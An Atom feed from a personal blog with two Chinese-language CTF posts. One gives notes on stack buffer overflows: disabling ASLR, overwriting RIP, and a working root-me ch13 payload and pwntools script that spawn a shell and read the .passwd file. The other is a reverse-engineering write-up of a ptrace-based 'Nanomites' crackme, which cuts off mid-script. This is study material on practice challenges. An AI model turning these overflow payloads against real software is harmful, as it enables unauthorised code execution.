<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FINSENTY54</title>
  
  <subtitle>几处早莺争暖树，谁家新燕啄春泥。</subtitle>
  <link href="http://finsenty54.github.io/atom.xml" rel="self"/>
  
  <link href="http://finsenty54.github.io/"/>
  <updated>2020-11-10T01:35:00.616Z</updated>
  <id>http://finsenty54.github.io/</id>
  
  <author>
    <name>finsenty54</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PWN keep going</title>
    <link href="http://finsenty54.github.io/2020/11/10/PWN_keep_going/"/>
    <id>http://finsenty54.github.io/2020/11/10/PWN_keep_going/</id>
    <published>2020-11-10T01:33:50.000Z</published>
    <updated>2020-11-10T01:35:00.616Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Sploitfun-Classic-Stack-Based-Buffer-Overflow"><a href="#Sploitfun-Classic-Stack-Based-Buffer-Overflow" class="headerlink" title="Sploitfun-Classic Stack Based Buffer Overflow"></a>Sploitfun-Classic Stack Based Buffer Overflow</h2><p><code>sudo bash -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code><br>关闭ASLR<br>具体可见<a href="https://blog.csdn.net/Plus_RE/article/details/79199772">https://blog.csdn.net/Plus_RE/article/details/79199772</a></p><p><code>gcc  -pie      </code>Create a dynamically linked position independent executable.<br>Linux 平台通过 PIE 机制来负责代码段和数据段的随机化工作</p><pre><code>gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</code></pre><a id="more"></a><p>加上<code>-g</code>选项以后，gcc在编译是会做以下额外的操作：</p><ol><li>创建符号表，符号表包含了程序中使用的变量名称的列表。</li><li>关闭所有的优化机制，以便程序执行过程中严格按照原来的C代码进行。</li></ol><p><code>-z execstack </code>禁用NX保护<br>详细的保护机制讲解<a href="https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p><p><code>gdb -q</code><br>  -q, –quiet, –silent<br>                     Do not print version number on startup.</p><pre><code>gdb-peda$ r `python -c &#39;print &quot;A&quot;*300&#39;`gdb-peda$ help p</code></pre><p>Print value of expression EXP.</p><pre><code>gdb-peda$ p/x $rip</code></pre><p><strong>这个教程太老了，还是32位上的</strong></p><hr><p>*经典root-me *</p><h2 id="ELF-x86-Stack-buffer-overflow-basic-1"><a href="#ELF-x86-Stack-buffer-overflow-basic-1" class="headerlink" title="ELF x86 - Stack buffer overflow basic 1"></a>ELF x86 - Stack buffer overflow basic 1</h2><h3 id="64-Bits-Linux-Stack-Based-Buffer-Overflow"><a href="#64-Bits-Linux-Stack-Based-Buffer-Overflow" class="headerlink" title="64 Bits Linux Stack Based Buffer Overflow"></a>64 Bits Linux Stack Based Buffer Overflow</h3><h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p> So memory addresses are <code>64 bits</code> long, but <code>user space </code>only uses<br>the <code>first 47 bits</code>; keep this in mind because if you specified an<br>address greater than<code> 0x00007fffffffffff</code>, you’ll raise an <code>exception</code>. So<br>that means that 0x4141414141414141 will raise exception, but the<br>address <code>0x0000414141414141</code> is safe. </p><pre><code>64位下，用户空间只用低47位，所以不要超过0x00007fffffffffff</code></pre><hr><pre><code>$./vuln $(python -c &#39;print &quot;A&quot;*300&#39;)gdb-peda$ x/20xg $rsp</code></pre><p><del>栈从高地址往低地址方向 扩展<br>溢出的时候，字符往高地址扩展</del></p><hr><h4 id="leave和ret"><a href="#leave和ret" class="headerlink" title="leave和ret"></a>leave和ret</h4><pre><code>leave = mov esp,ebp ; pop ebpret = pop EIP</code></pre><p>leave 执行后<br><code>指向返回地址</code><br>再<code> pop 将返回地址赋给 EIP</code></p><h4 id="不能控制RIP"><a href="#不能控制RIP" class="headerlink" title="不能控制RIP"></a>不能控制RIP</h4><p>So the program ends and we’re not able to control RIP:( Why?Because we  <code> override   too   much   bits</code>,   remember   biggest   address   is 0x00007fffffffffff and we try to overflow using 0x4141414141414141</p><p>de08-dd00=0x108  ==264</p><h4 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h4><pre><code>gdb-peda$ r $(python -c &#39;print &quot;A&quot;*264+&quot;B&quot;*6&#39;)</code></pre><p><del>ASLR 开起来了</del></p><p>输入是”A”*264+”ABCDEF”</p><pre><code>0x7fffffffde28:    0x41    0x42    0x43    0x44    0x45    0x46    0x00    0x00</code></pre><p>是<code>按序</code>填充的</p><p><strong>但有因为小端序，所以又倒序读入RIP</strong><br><code>RIP: 0x464544434241 (&#39;ABCDEF&#39;)</code></p><hr><h4 id="跳转到用户控制的地址"><a href="#跳转到用户控制的地址" class="headerlink" title="跳转到用户控制的地址"></a>跳转到用户控制的地址</h4><p><em>（显然没有开NX）</em></p><pre><code>&quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdc\x90&quot;[::-1]</code></pre><p><code>0x7fffffffdc90</code>buf在栈中开始地址</p><p>We  need  to  reverse the  memory  address  because  it’s  a <code> little  endian architecture</code>. That’sexactly what<code>[::-1]</code>does in python.<br>[::-1]逆序</p><hr><p>本题考察了Unix基本输入输出流与缓冲</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">int</span> var;</span><br><span class="line">  <span class="keyword">int</span> check = <span class="number">0x04030201</span>;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line"> </span><br><span class="line">  fgets(buf,<span class="number">45</span>,<span class="built_in">stdin</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[buf]: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[check] %p\n&quot;</span>, check);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((check != <span class="number">0x04030201</span>) &amp;&amp; (check != <span class="number">0xdeadbeef</span>))</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;\nYou are on the right way!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (check == <span class="number">0xdeadbeef</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Yeah dude! You win!\nOpening your shell...\n&quot;</span>);</span><br><span class="line">     setreuid(geteuid(), geteuid());</span><br><span class="line">     system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Shell closed! Bye.\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>标准输入后，还会跟上’\r\n’<br>fgets()读取45-1个字节，或者遇到’\n’停止<br>所以只是溢出4个字节即可，覆盖掉<code>check</code><br><code>0xdeadbeef</code>还需要逆序</p><p><del>但我不知道unix的输入输出流</del><br>payload:(python -c ‘print “a”*40+”DEADBEEF”.decode(“hex”)[::-1]’;cat) | ./ch13<br>得到shell后：<code>cat .passwd</code></p><hr><p>别人使用脚本编写的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># solution by MtucX</span></span><br><span class="line"># Require pwntools</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">pwn_socket=ssh(host=&#x27;challenge02.root-me.org&#x27; ,user=&#x27;app-systeme-ch13&#x27; ,password=&#x27;app-systeme-ch13&#x27;,port=2222)</span><br><span class="line">pwned=pwn_socket.process(executable=&#x27;./ch13&#x27;)</span><br><span class="line">pwned.sendline(&#x27;A&#x27; * 40  + &#x27;\xef\xbe\xad\xde&#x27;)</span><br><span class="line">pwned.sendline(&#x27;cat .passwd&#x27;)</span><br><span class="line">pwned.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Sploitfun-Classic-Stack-Based-Buffer-Overflow&quot;&gt;&lt;a href=&quot;#Sploitfun-Classic-Stack-Based-Buffer-Overflow&quot; class=&quot;headerlink&quot; title=&quot;Sploitfun-Classic Stack Based Buffer Overflow&quot;&gt;&lt;/a&gt;Sploitfun-Classic Stack Based Buffer Overflow&lt;/h2&gt;&lt;p&gt;&lt;code&gt;sudo bash -c &amp;quot;echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&amp;quot;&lt;/code&gt;&lt;br&gt;关闭ASLR&lt;br&gt;具体可见&lt;a href=&quot;https://blog.csdn.net/Plus_RE/article/details/79199772&quot;&gt;https://blog.csdn.net/Plus_RE/article/details/79199772&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gcc  -pie      &lt;/code&gt;Create a dynamically linked position independent executable.&lt;br&gt;Linux 平台通过 PIE 机制来负责代码段和数据段的随机化工作&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc -g -fno-stack-protector -z execstack -o vuln vuln.c&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x64 - Nanomites - Introduction_WP</title>
    <link href="http://finsenty54.github.io/2020/10/31/ELF%20x64%20-%20Nanomites%20-%20Introduction_WP/"/>
    <id>http://finsenty54.github.io/2020/10/31/ELF%20x64%20-%20Nanomites%20-%20Introduction_WP/</id>
    <published>2020-10-31T02:39:38.000Z</published>
    <updated>2020-10-31T08:53:12.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x64-Nanomites-Introduction-WP"><a href="#ELF-x64-Nanomites-Introduction-WP" class="headerlink" title="ELF x64 - Nanomites - Introduction_WP"></a>ELF x64 - Nanomites - Introduction_WP</h2><p>这是运用了<code>Debug Blocker</code>技术的题目<br>又花了些时间，终于破解了</p><h3 id="gdb-设置跟踪父进程还是子进程"><a href="#gdb-设置跟踪父进程还是子进程" class="headerlink" title="gdb  设置跟踪父进程还是子进程"></a>gdb  设置跟踪父进程还是子进程</h3><p><code>set follow-fork-mode parrent|child</code><br>当发生fork时，指示调试器执行父进程还是子进程</p><h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><p>在程序执行到<code>int3</code>时，就会触发 <code>SIGTRAP </code>信号，</p><a id="more"></a><pre><code> long ptrace(enum __ptrace_request request,             pid_t pid,             void *addr,             void *data);</code></pre><p>参数data：作用则根据request的不同而变化，如果需要向目标进程中写入数据，data存放的是需要写入的数据；如果从目标进程中读数据，data将存放返回的数据</p><h3 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h3><p>可以先用strace来观察在系统调用<br><code>strace -i ./ch28.bin</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[00007fa5f9b6bf4e] <span class="built_in">read</span>(0, toto  /输入值</span><br><span class="line"><span class="string">&quot;toto\n&quot;</span>, 1024) = 5</span><br><span class="line">[00007fa5f9b75c22] mmap(NULL, 321, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fa5f9c8e000</span><br><span class="line">[00007fa5f9b4857b] <span class="built_in">clone</span>(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fa5f9c43810) = 131358</span><br><span class="line">[00007fa5f9b48286] wait4(131358, [&#123;WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP&#125;], 0, NULL) = 131358</span><br><span class="line">[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=131358, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_GETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_SETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_CONT, 131358, NULL, 0) = 0</span><br><span class="line">[00007fa5f9b48286] wait4(131358, [&#123;WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP&#125;], 0, NULL) = 131358</span><br><span class="line">[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=131358, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_GETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_SETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_CONT, 131358, NULL, 0) = 0</span><br><span class="line">[00007fa5f9b48286] wait4(131358, [&#123;WIFEXITED(s) &amp;&amp; WEXITSTATUS(s) == 1&#125;], 0, NULL) = 131358</span><br><span class="line">[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=131358, si_uid=1000, si_status=1, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[00007fa5f9b48286] wait4(131358, 0x7fff0dde4a1c, 0, NULL) = -1 ECHILD (No child processes)</span><br><span class="line">[00007fa5f9b6bff3] write(1, <span class="string">&quot;Wrong! try hard! :)\n&quot;</span>, 20Wrong! try hard! :)</span><br><span class="line">) = 20</span><br><span class="line">[00007fa5f9b6c087] lseek(0, -1, SEEK_CUR) = -1 ESPIPE (Illegal seek)</span><br><span class="line">[00007fa5f9b48759] exit_group(0)        = ?</span><br><span class="line">[????????????????] +++ exited with 0 +++</span><br></pre></td></tr></table></figure><p>当我输入值‘toto’，触发了两次 SIGTRAP，之后退出</p><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>直接IDA PRO反编译<br>其他的细节都不管，就看我们需要的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_400871</span><span class="params">(__int64 input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+1Ch] [rbp-F4h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+F8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> pid; <span class="comment">// [rsp+104h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *dest; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stat_loc = <span class="number">0</span>;</span><br><span class="line">  dest = mmap(<span class="number">0L</span>L, <span class="number">0x141</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);   <span class="comment">// 0x7ffff7ffb000</span></span><br><span class="line">  <span class="built_in">memcpy</span>(dest, src, <span class="number">0x8D</span>uLL);                   <span class="comment">// src == 0x601080 指向400ac0( 0x48</span></span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> ( !pid )                                   <span class="comment">// 子进程</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;So you want to trace me?!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">42</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = dest;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(__int64))dest)(input);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( waitpid(pid, &amp;stat_loc, <span class="number">0</span>) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)stat_loc == <span class="number">127</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE1(stat_loc) == <span class="number">5</span> )               <span class="comment">// 0x57f &gt;&gt;8 =0x5</span></span><br><span class="line">        sub_400736((__int64)dest, pid);</span><br><span class="line">      ptrace(PTRACE_CONT, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pid, <span class="number">0L</span>L, <span class="number">0L</span>L);  <span class="comment">//表示继续执行子进程</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( BYTE1(stat_loc) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Wrong! try hard! :)&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;POOOOOOOOOOOOOOOOOOOOOOOOO God damn!! You won!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>子进程会执行 memcpy()h函数复制到<code>dest</code>的代码，<code>src == 0x601080</code> 指向<code>400ac0</code>，所以实际复制的是<code>400ac0</code>处的指令。</p><p><a href="https://imgchr.com/i/BUFlQK"><img src="https://s1.ax1x.com/2020/10/31/BUFlQK.jpg" alt="BUFlQK.jpg"></a></p><p><code>RDI </code>保存着我们输入的数据，每次读取一个字节，存入<code>al</code>，之后<code>int3</code>,就会触发SIGTRAP，父进程进行调试子进程。</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400736</span><span class="params">(__int64 dest, <span class="keyword">unsigned</span> <span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+10h] [rbp-F0h] 0x7fffffffdc00 ==RAX 子进程寄存器值放在这里</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+90h] [rbp-70h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+A0h] [rbp-60h] 0x400a30 有问题</span></span><br><span class="line">  __int64 dest_1; <span class="comment">// [rsp+F0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+F8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v9; <span class="comment">// [rsp+FFh] [rbp-1h]</span></span><br><span class="line">                                                <span class="comment">// 0x20cf9 子进程pid</span></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  dest_1 = dest + <span class="number">1</span>;                            <span class="comment">// dest + 1</span></span><br><span class="line">  result = ptrace(PTRACE_GETREGS, pid, <span class="number">0L</span>L, &amp;v3);<span class="comment">// 获取值所有寄存器值？？</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">12</span>; ++i )                   <span class="comment">// 13个int 3</span></span><br><span class="line">  &#123;                                             <span class="comment">// rbp-0x8 = i</span></span><br><span class="line">    result = seg_6010A0[<span class="number">3</span> * i];</span><br><span class="line">    <span class="keyword">if</span> ( v5 - dest_1 == result )                <span class="comment">// v5 = 0x7ffff7ffb00c </span></span><br><span class="line">                                                <span class="comment">// c-1 = b ==11</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v9++ + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( seg_6010A0[<span class="number">3</span> * i + <span class="number">1</span> + i % <span class="number">2</span>] == v4 )<span class="comment">// v4 == input 表示输入值放在子进程r9中  0x7fffffffdc50</span></span><br><span class="line">          v6 |= <span class="number">0x40</span>uLL;                        <span class="comment">// 修改了V6 0x7fffffffdc90 第十八个 表示EFLAGS</span></span><br><span class="line">                                                <span class="comment">// 之前 rax 处 程序 JE zf=0 才不跳转 如果跳转则程序结束</span></span><br><span class="line">        result = ptrace(PTRACE_SETREGS, pid, <span class="number">0L</span>L, &amp;v3);<span class="comment">// 设置值</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hummmmmmm NO WAY.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">42</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>ptrace(PTRACE_GETREGS, pid, 0LL, &amp;v3)</code>获取所有子进程寄存器值，存放在V3地址处。</p><p><code> if ( seg_6010A0[3 * i + 1 + i % 2] == v4 )</code>// v4 == input 表示输入值放在子进程r9中  0x7fffffffdc50<br>这条语句就是我们需要的，其将我们的输入值与<code>6010A0</code>处的值进行比较，如果相等，则修改V6，也就是EFLAGS，<code>将ZF置1</code>，<code>JNE不跳转</code>，如果跳转了直接结束进程。</p><p><code>ptrace(PTRACE_SETREGS, pid, 0LL, &amp;v3)</code>将修改后的寄存器值重新赋给子进程</p><hr><p>从<code>if</code>知道，比较共进行13次，下面编写python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">data=[]</span><br><span class="line">flag=[]</span><br><span class="line">print(<span class="string">&quot;give me a bottle of rum!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ch28.txt&#x27;</span>,<span class="string">&#x27;rt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span>(line.find(<span class="string">&#x27;db&#x27;</span>)!=<span class="number">-1</span>):</span><br><span class="line">            pos=line.find(<span class="string">&#x27;db&#x27;</span>)</span><br><span class="line">            item=line[pos+<span class="number">4</span>:pos+<span class="number">6</span>]</span><br><span class="line">            data.append(<span class="built_in">int</span>(item,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    print(<span class="built_in">format</span>(i,<span class="string">&#x27;x&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    flag.append(data[<span class="number">3</span>*i+<span class="number">1</span>+i%<span class="number">2</span>])</span><br><span class="line">print(<span class="string">&#x27;1111111111111111111111111111&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line">print(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure><p>ch28.txt保存<code>6010A0</code>开始的数据。</p><p><a href="https://imgchr.com/i/BUkHu8"><img src="https://s1.ax1x.com/2020/10/31/BUkHu8.jpg" alt="BUkHu8.jpg"></a><br>运行得到flag</p><p>make -n 显示命令，但不执行</p><hr><h3 id="大佬代码"><a href="#大佬代码" class="headerlink" title="大佬代码"></a>大佬代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;start_with_anything&quot;</span></span><br><span class="line">gdb.execute(<span class="string">&#x27;file ./ch28.bin&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;set pagination off&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;br *0x40080d&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;run &lt;&lt;&lt; &#x27;</span>+password)</span><br><span class="line">rdx = 